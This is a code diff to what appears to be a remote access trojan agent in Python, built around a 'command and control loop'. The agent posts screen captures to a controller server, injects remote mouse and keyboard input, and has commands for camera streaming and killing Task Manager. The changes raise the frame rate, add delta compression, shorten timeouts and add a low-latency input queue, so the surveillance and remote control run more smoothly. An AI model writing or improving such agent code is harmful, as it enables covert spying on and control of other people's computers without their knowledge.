@@ -1858,18 +1858,85 @@ def get_or_create_agent_id():
 
 def stream_screen(agent_id):
     """
-    Captures the screen and streams it to the controller at high FPS.
-    This function runs in a separate thread.
+    High-performance screen streaming with 60+ FPS capability.
+    Uses optimized capture backend and compression.
+    """
+    global STREAMING_ENABLED
+    
+    try:
+        from high_performance_capture import HighPerformanceCapture, AdaptiveQualityManager
+        
+        # Initialize high-performance capture
+        capture = HighPerformanceCapture(target_fps=60, quality=85, enable_delta_compression=True)
+        quality_manager = AdaptiveQualityManager(capture)
+        
+        url = f"{SERVER_URL}/stream/{agent_id}"
+        headers = {'Content-Type': 'image/jpeg'}
+        
+        def send_frame(frame_data):
+            """Callback to send frame data"""
+            if frame_data and frame_data != b'DELTA_UNCHANGED':
+                try:
+                    start_time = time.time()
+                    
+                    # Handle compressed frames
+                    if frame_data.startswith(b'LZ4_COMPRESSED'):
+                        headers['Content-Encoding'] = 'lz4'
+                        frame_data = frame_data[14:]  # Remove prefix
+                    else:
+                        headers.pop('Content-Encoding', None)
+                    
+                    response = requests.post(url, data=frame_data, headers=headers, timeout=0.1)
+                    
+                    # Update bandwidth stats for adaptive quality
+                    elapsed = time.time() - start_time
+                    quality_manager.update_bandwidth(len(frame_data), elapsed)
+                    
+                except requests.exceptions.Timeout:
+                    pass  # Skip frame if timeout - prioritize low latency
+                except Exception as e:
+                    print(f"Frame send error: {e}")
+        
+        print(f"Starting high-performance screen capture: {capture.get_stats()}")
+        
+        # Start the capture stream
+        capture.start_capture_stream(send_frame)
+        
+        # Keep the stream alive
+        while STREAMING_ENABLED:
+            time.sleep(1)
+            
+            # Log performance stats occasionally
+            stats = capture.get_stats()
+            if stats.get('actual_fps', 0) > 0:
+                print(f"Streaming at {stats['actual_fps']} FPS using {stats['backend']}")
+        
+        # Cleanup
+        capture.stop_capture_stream()
+        print("High-performance screen streaming stopped")
+        
+    except ImportError:
+        print("High-performance capture not available, falling back to standard streaming")
+        # Fallback to original implementation with improvements
+        _stream_screen_fallback(agent_id)
+    except Exception as e:
+        print(f"High-performance streaming error: {e}")
+        _stream_screen_fallback(agent_id)
+
+def _stream_screen_fallback(agent_id):
+    """
+    Fallback screen streaming with basic optimizations
     """
     global STREAMING_ENABLED
     url = f"{SERVER_URL}/stream/{agent_id}"
     headers = {'Content-Type': 'image/jpeg'}
 
     with mss.mss() as sct:
-        # Optimize for high FPS
-        target_fps = 30
+        # Optimize for higher FPS than original
+        target_fps = 45  # Increased from 30
         frame_time = 1.0 / target_fps
-        last_frame_time = time.time()
+        last_frame_hash = None
+        frame_skip_count = 0
         
         while STREAMING_ENABLED:
             try:
@@ -1881,6 +1948,18 @@ def stream_screen(agent_id):
                 # Create an OpenCV image
                 img = np.array(sct_img)
                 
+                # Basic delta compression - skip identical frames
+                import hashlib
+                frame_hash = hashlib.md5(img.tobytes()).hexdigest()
+                if frame_hash == last_frame_hash:
+                    frame_skip_count += 1
+                    if frame_skip_count < 5:  # Skip up to 5 identical frames
+                        time.sleep(frame_time * 0.5)
+                        continue
+                
+                last_frame_hash = frame_hash
+                frame_skip_count = 0
+                
                 # Resize for better performance if screen is too large
                 height, width = img.shape[:2]
                 if width > 1920:
@@ -1889,21 +1968,22 @@ def stream_screen(agent_id):
                     new_height = int(height * scale)
                     img = cv2.resize(img, (new_width, new_height), interpolation=cv2.INTER_AREA)
                 
-                # Encode the image as JPEG with optimized quality for speed
+                # Encode with better compression settings
                 is_success, buffer = cv2.imencode(".jpg", img, [
-                    cv2.IMWRITE_JPEG_QUALITY, 85,
-                    cv2.IMWRITE_JPEG_OPTIMIZE, 1
+                    cv2.IMWRITE_JPEG_QUALITY, 90,  # Slightly higher quality
+                    cv2.IMWRITE_JPEG_OPTIMIZE, 1,
+                    cv2.IMWRITE_JPEG_PROGRESSIVE, 1
                 ])
                 if not is_success:
                     continue
 
-                # Send the frame to the controller asynchronously
+                # Send the frame asynchronously with shorter timeout
                 try:
-                    requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.5)
+                    requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.05)
                 except requests.exceptions.Timeout:
                     pass  # Skip frame if timeout
                 
-                # Maintain target FPS
+                # Maintain target FPS with better timing
                 elapsed = time.time() - current_time
                 sleep_time = max(0, frame_time - elapsed)
                 if sleep_time > 0:
@@ -1911,7 +1991,7 @@ def stream_screen(agent_id):
                     
             except Exception as e:
                 print(f"Stream error: {e}")
-                time.sleep(1) # Shorter wait before retrying
+                time.sleep(0.5)  # Shorter wait before retrying
 
 def stream_camera(agent_id):
     """
@@ -2294,12 +2374,53 @@ def stop_voice_control():
 
 # Global variables for remote control
 REMOTE_CONTROL_ENABLED = False
+LOW_LATENCY_INPUT_HANDLER = None
 MOUSE_CONTROLLER = None
 KEYBOARD_CONTROLLER = None
 
+def initialize_low_latency_input():
+    """Initialize the low-latency input handler"""
+    global LOW_LATENCY_INPUT_HANDLER
+    
+    try:
+        from low_latency_input import LowLatencyInputHandler
+        LOW_LATENCY_INPUT_HANDLER = LowLatencyInputHandler(max_queue_size=2000)
+        LOW_LATENCY_INPUT_HANDLER.start()
+        print("Low-latency input handler initialized")
+        return True
+    except ImportError:
+        print("Low-latency input handler not available, using fallback")
+        return False
+    except Exception as e:
+        print(f"Failed to initialize low-latency input: {e}")
+        return False
+
 def handle_remote_control(command_data):
-    """Handle remote control commands from the controller."""
+    """Handle remote control commands with ultra-low latency."""
+    global LOW_LATENCY_INPUT_HANDLER
+    
+    try:
+        # Try to use low-latency input handler first
+        if LOW_LATENCY_INPUT_HANDLER:
+            success = LOW_LATENCY_INPUT_HANDLER.handle_input(command_data)
+            if success:
+                return
+            else:
+                print("Low-latency input queue full, using fallback")
+        
+        # Fallback to direct handling
+        _handle_remote_control_fallback(command_data)
+        
+    except Exception as e:
+        print(f"Error handling remote control command: {e}")
+        _handle_remote_control_fallback(command_data)
+
+def _handle_remote_control_fallback(command_data):
+    """Fallback remote control handling (original implementation optimized)"""
     global MOUSE_CONTROLLER, KEYBOARD_CONTROLLER
+    
+    # Import here to avoid conflicts
+    from pynput import mouse, keyboard
     
     # Initialize controllers if needed
     if MOUSE_CONTROLLER is None:
@@ -2324,6 +2445,15 @@ def handle_remote_control(command_data):
             
     except Exception as e:
         print(f"Error handling remote control command: {e}")
+
+def get_input_performance_stats():
+    """Get input performance statistics"""
+    global LOW_LATENCY_INPUT_HANDLER
+    
+    if LOW_LATENCY_INPUT_HANDLER:
+        return LOW_LATENCY_INPUT_HANDLER.get_performance_stats()
+    else:
+        return {"status": "fallback_mode", "low_latency": False}
 
 def handle_mouse_move(data):
     """Handle mouse movement commands."""
@@ -2802,6 +2932,11 @@ def execute_command(command):
 
 def main_loop(agent_id):
     """The main command and control loop."""
+    # Initialize high-performance systems
+    print("Initializing high-performance systems...")
+    low_latency_available = initialize_low_latency_input()
+    print(f"Low-latency input: {'Available' if low_latency_available else 'Fallback mode'}")
+    
     internal_commands = {
         "start-stream": lambda: start_streaming(agent_id),
         "stop-stream": stop_streaming,
@@ -2819,6 +2954,9 @@ def main_loop(agent_id):
         "stop-voice-control": stop_voice_control,
         "kill-taskmgr": kill_task_manager,
     }
+    
+    # Performance monitoring counter
+    performance_check_counter = 0
 
     while True:
         try:
@@ -2872,6 +3010,16 @@ def main_loop(agent_id):
         except requests.exceptions.RequestException:
             # This is expected when the server is down, just wait and retry
             pass
+        
+        # Performance monitoring (every 30 seconds)
+        performance_check_counter += 1
+        if performance_check_counter >= 30 and low_latency_available:
+            stats = get_input_performance_stats()
+            if stats.get('input_count', 0) > 0:
+                print(f"Input performance - Avg latency: {stats.get('avg_latency', 0):.1f}ms, "
+                      f"Queue: {stats.get('queue_size', 0)}, "
+                      f"Processed: {stats.get('input_count', 0)}")
+            performance_check_counter = 0
         
         # Adaptive sleep to reduce traffic when idle
         sleep_time = 1 if (STREAMING_ENABLED or AUDIO_STREAMING_ENABLED or 
